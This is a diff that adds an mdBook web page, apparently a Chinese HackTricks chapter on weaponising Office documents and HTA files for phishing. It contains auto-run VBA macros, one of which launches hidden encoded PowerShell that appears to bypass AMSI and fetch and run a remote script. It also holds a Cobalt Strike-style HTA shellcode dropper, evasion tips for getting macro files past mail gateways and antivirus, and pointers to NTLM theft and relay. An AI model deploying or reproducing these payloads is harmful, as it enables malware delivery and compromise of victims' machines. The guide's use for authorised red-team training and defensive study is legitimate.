@@ -1,0 +1,355 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Phishing Files &amp; Documents</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="phishing-files--documents"><a class="header" href="#phishing-files--documents">Phishing Files &amp; Documents</a></h1>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="office-documents"><a class="header" href="#office-documents">Office Documents</a></h2>
+<p>Microsoft Word 在打开文件之前会执行文件数据验证。数据验证以数据结构识别的形式进行，符合 OfficeOpenXML 标准。如果在数据结构识别过程中发生任何错误，正在分析的文件将无法打开。</p>
+<p>通常，包含宏的 Word 文件使用 <code>.docm</code> 扩展名。然而，可以通过更改文件扩展名来重命名文件，并仍然保持其宏执行能力。<br />
+例如，RTF 文件设计上不支持宏，但重命名为 RTF 的 DOCM 文件将被 Microsoft Word 处理，并能够执行宏。<br />
+相同的内部机制适用于 Microsoft Office 套件的所有软件（Excel、PowerPoint 等）。</p>
+<p>您可以使用以下命令检查某些 Office 程序将执行哪些扩展名：</p>
+<pre><code class="language-bash">assoc | findstr /i "word excel powerp"
+</code></pre>
+<p>DOCX 文件引用远程模板（文件 - 选项 - 插件 - 管理：模板 - 转到）并包含宏也可以“执行”宏。</p>
+<h3 id="外部图像加载"><a class="header" href="#外部图像加载">外部图像加载</a></h3>
+<p>转到：<em>插入 --&gt; 快速部件 --&gt; 字段</em><br />
+&amp;#xNAN;<em><strong>类别</strong>：链接和引用，<strong>字段名称</strong>：includePicture，以及 <strong>文件名或 URL</strong>:</em> http://&lt;ip&gt;/whatever</p>
+<p><img src="../../.gitbook/assets/image%20(155).png" alt="" /></p>
+<h3 id="宏后门"><a class="header" href="#宏后门">宏后门</a></h3>
+<p>可以使用宏从文档中运行任意代码。</p>
+<h4 id="自动加载函数"><a class="header" href="#自动加载函数">自动加载函数</a></h4>
+<p>它们越常见，AV 检测到它们的可能性就越大。</p>
+<ul>
+<li>AutoOpen()</li>
+<li>Document_Open()</li>
+</ul>
+<h4 id="宏代码示例"><a class="header" href="#宏代码示例">宏代码示例</a></h4>
+<pre><code class="language-vba">Sub AutoOpen()
+CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
+End Sub
+</code></pre>
+<pre><code class="language-vba">Sub AutoOpen()
+
+Dim Shell As Object
+Set Shell = CreateObject("wscript.shell")
+Shell.Run "calc"
+
+End Sub
+</code></pre>
+<pre><code class="language-vba">Dim author As String
+author = oWB.BuiltinDocumentProperties("Author")
+With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
+.StdIn.WriteLine author
+.StdIn.WriteBlackLines 1
+</code></pre>
+<pre><code class="language-vba">Dim proc As Object
+Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+proc.Create "powershell &lt;beacon line generated&gt;
+</code></pre>
+<h4 id="手动删除元数据"><a class="header" href="#手动删除元数据">手动删除元数据</a></h4>
+<p>转到 <strong>文件 &gt; 信息 &gt; 检查文档 &gt; 检查文档</strong>，这将打开文档检查器。点击 <strong>检查</strong>，然后在 <strong>文档属性和个人信息</strong> 旁边点击 <strong>全部删除</strong>。</p>
+<h4 id="文档扩展名"><a class="header" href="#文档扩展名">文档扩展名</a></h4>
+<p>完成后，选择 <strong>另存为类型</strong> 下拉菜单，将格式从 <strong><code>.docx</code></strong> 更改为 <strong>Word 97-2003 <code>.doc</code></strong>。<br />
+这样做是因为你 <strong>不能在 <code>.docx</code> 中保存宏</strong>，并且 <strong><code>.docm</code></strong> 扩展名有一个 <strong>污名</strong>（例如，缩略图图标上有一个巨大的 <code>!</code>，一些网络/电子邮件网关完全阻止它们）。因此，这个 <strong>遗留的 <code>.doc</code> 扩展名是最佳折衷</strong>。</p>
+<h4 id="恶意宏生成器"><a class="header" href="#恶意宏生成器">恶意宏生成器</a></h4>
+<ul>
+<li>MacOS</li>
+<li><a href="https://github.com/cldrn/macphish"><strong>macphish</strong></a></li>
+<li><a href="https://github.com/cedowens/Mythic-Macro-Generator"><strong>Mythic Macro Generator</strong></a></li>
+</ul>
+<h2 id="hta-文件"><a class="header" href="#hta-文件">HTA 文件</a></h2>
+<p>HTA 是一个 Windows 程序，它 <strong>结合了 HTML 和脚本语言（如 VBScript 和 JScript）</strong>。它生成用户界面并作为“完全信任”的应用程序执行，且不受浏览器安全模型的限制。</p>
+<p>HTA 通过 <strong><code>mshta.exe</code></strong> 执行，通常与 <strong>Internet Explorer</strong> 一起 <strong>安装</strong>，使得 <strong><code>mshta</code> 依赖于 IE</strong>。因此，如果它被卸载，HTA 将无法执行。</p>
+<pre><code class="language-html">&lt;--! Basic HTA Execution --&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Hello World&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;Hello World&lt;/h2&gt;
+&lt;p&gt;This is an HTA...&lt;/p&gt;
+&lt;/body&gt;
+
+&lt;script language="VBScript"&gt;
+Function Pwn()
+Set shell = CreateObject("wscript.Shell")
+shell.run "calc"
+End Function
+
+Pwn
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<pre><code class="language-html">&lt;--! Cobal Strike generated HTA without shellcode --&gt;
+&lt;script language="VBScript"&gt;
+Function var_func()
+var_shellcode = "&lt;shellcode&gt;"
+
+Dim var_obj
+Set var_obj = CreateObject("Scripting.FileSystemObject")
+Dim var_stream
+Dim var_tempdir
+Dim var_tempexe
+Dim var_basedir
+Set var_tempdir = var_obj.GetSpecialFolder(2)
+var_basedir = var_tempdir &amp; "\" &amp; var_obj.GetTempName()
+var_obj.CreateFolder(var_basedir)
+var_tempexe = var_basedir &amp; "\" &amp; "evil.exe"
+Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
+For i = 1 to Len(var_shellcode) Step 2
+var_stream.Write Chr(CLng("&amp;H" &amp; Mid(var_shellcode,i,2)))
+Next
+var_stream.Close
+Dim var_shell
+Set var_shell = CreateObject("Wscript.Shell")
+var_shell.run var_tempexe, 0, true
+var_obj.DeleteFile(var_tempexe)
+var_obj.DeleteFolder(var_basedir)
+End Function
+
+var_func
+self.close
+&lt;/script&gt;
+</code></pre>
+<h2 id="强制-ntlm-认证"><a class="header" href="#强制-ntlm-认证">强制 NTLM 认证</a></h2>
+<p>有几种方法可以**“远程”强制 NTLM 认证**，例如，您可以在用户访问的电子邮件或 HTML 中添加<strong>隐形图像</strong>（甚至是 HTTP MitM？）。或者将<strong>文件地址</strong>发送给受害者，这将<strong>触发</strong>仅仅<strong>打开文件夹</strong>所需的<strong>认证</strong>。</p>
+<p><strong>在以下页面中查看这些想法和更多内容：</strong></p>
+<p>{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
+<a href="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html">printers-spooler-service-abuse.md</a>
+{% endcontent-ref %}</p>
+<p>{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
+<a href="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.html">places-to-steal-ntlm-creds.md</a>
+{% endcontent-ref %}</p>
+<h3 id="ntlm-中继"><a class="header" href="#ntlm-中继">NTLM 中继</a></h3>
+<p>不要忘记，您不仅可以窃取哈希或认证，还可以<strong>执行 NTLM 中继攻击</strong>：</p>
+<ul>
+<li><a href="../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html#ntml-relay-attack"><strong>NTLM 中继攻击</strong></a></li>
+<li><a href="../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#ntlm-relay-to-ad-cs-http-endpoints-esc8"><strong>AD CS ESC8 (NTLM 中继到证书)</strong></a></li>
+</ul>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../generic-methodologies-and-resources/phishing-methodology/detecting-phising.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../generic-methodologies-and-resources/basic-forensic-methodology/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../generic-methodologies-and-resources/phishing-methodology/detecting-phising.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../generic-methodologies-and-resources/basic-forensic-methodology/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
